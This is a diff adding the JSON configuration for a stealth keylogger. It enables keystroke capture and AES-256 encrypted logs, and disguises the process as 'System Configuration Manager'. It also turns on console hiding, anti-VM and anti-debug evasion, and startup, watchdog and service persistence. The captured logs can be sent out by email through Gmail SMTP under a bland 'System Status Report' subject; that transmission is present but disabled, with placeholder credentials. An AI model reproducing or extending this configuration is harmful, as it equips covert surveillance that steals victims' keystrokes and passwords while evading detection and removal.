@@ -1,0 +1,39 @@
+{
+  "keylogger": {
+    "enabled": true,
+    "log_file": "logs/stealth_keylog.txt",
+    "encrypted_log_file": "logs/stealth_keylog.enc",
+    "log_special_keys": true,
+    "debug_mode": false
+  },
+  "encryption": {
+    "enabled": true,
+    "key_file": ".stealth.key",
+    "algorithm": "AES-256"
+  },
+  "stealth": {
+    "enabled": true,
+    "process_name": "System Configuration Manager",
+    "hide_console": true,
+    "anti_vm": true,
+    "anti_debug": true
+  },
+  "persistence": {
+    "startup_enabled": true,
+    "watchdog_enabled": true,
+    "service_name": "SystemConfigManager"
+  },
+  "transmission": {
+    "enabled": false,
+    "method": "email",
+    "interval": 1800,
+    "email": {
+      "smtp_server": "smtp.gmail.com",
+      "smtp_port": 587,
+      "username": "your_email@gmail.com",
+      "password": "your_app_password",
+      "to_email": "your_email@gmail.com",
+      "subject": "System Status Report"
+    }
+  }
+}
